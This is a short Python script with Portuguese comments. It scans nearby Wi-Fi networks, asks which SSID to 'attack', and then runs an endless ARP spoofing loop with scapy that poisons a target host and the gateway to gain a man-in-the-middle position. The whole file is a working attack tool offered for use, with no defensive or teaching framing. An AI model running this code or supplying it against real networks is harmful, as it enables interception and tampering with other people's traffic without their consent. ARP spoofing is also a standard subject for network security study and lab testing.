import time
from wifi import Cell
from scapy.all import ARP, send

# Função para escanear redes Wi-Fi e escolher uma rede
def scan_and_choose_network(interface):
    networks = Cell.all(interface)
    available_networks = []
    for network in networks:
        available_networks.append({"SSID": network.ssid, "BSSID": network.address, "Channel": network.channel, "Signal": network.signal})
        print(f"SSID: {network.ssid}, BSSID: {network.address}, Canal: {network.channel}, Sinal: {network.signal}")
    
    if not available_networks:
        print("Nenhuma rede encontrada.")
        return None

    ssid_choice = input("Digite o SSID da rede que deseja atacar: ")
    for network in available_networks:
        if network['SSID'] == ssid_choice:
            return network
    print("Rede não encontrada.")
    return None

# Função para spoofing ARP (MITM)
def arp_spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
    send(packet, verbose=False)

if __name__ == "__main__":
    interface = "wlan0"
    chosen_network = scan_and_choose_network(interface)
    
    if chosen_network:
        target_ip = input("Digite o IP do alvo: ")
        gateway_ip = input("Digite o IP do Gateway: ")
        print(f"Iniciando ARP spoofing entre {target_ip} e {gateway_ip}...")
        try:
            while True:
                arp_spoof(target_ip, gateway_ip)
                arp_spoof(gateway_ip, target_ip)
                time.sleep(2)
        except KeyboardInterrupt:
            print("Spoofing ARP interrompido.")
